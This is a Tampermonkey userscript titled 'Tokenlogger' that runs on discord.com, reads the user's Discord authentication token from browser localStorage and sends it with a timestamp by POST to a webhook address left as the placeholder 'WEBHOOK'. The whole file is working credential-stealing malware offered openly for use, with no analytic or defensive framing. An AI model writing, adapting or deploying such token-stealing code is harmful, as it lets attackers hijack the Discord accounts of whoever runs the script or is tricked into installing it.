// ==UserScript==
// @name         Tokenlogger
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  A simple Tokenlogger for Tampermonkey. (Browser Extension)
// @author       Lyzev
// @run-at       document-start
// @match        https://discord.com/*
// @grant        none
// ==/UserScript==

(function() {
    const webhook = "WEBHOOK"
    const token = localStorage.token
    if (token != null) {
        const request = new XMLHttpRequest()
        request.open("POST", webhook)
        request.setRequestHeader('Content-type', 'application/json')
        const params = {
            username: "Tokenlogger",
            content: "Date: `" + new Date() + "`\nToken: `" + token + "`"
        }
        request.send(JSON.stringify(params))
    }
})();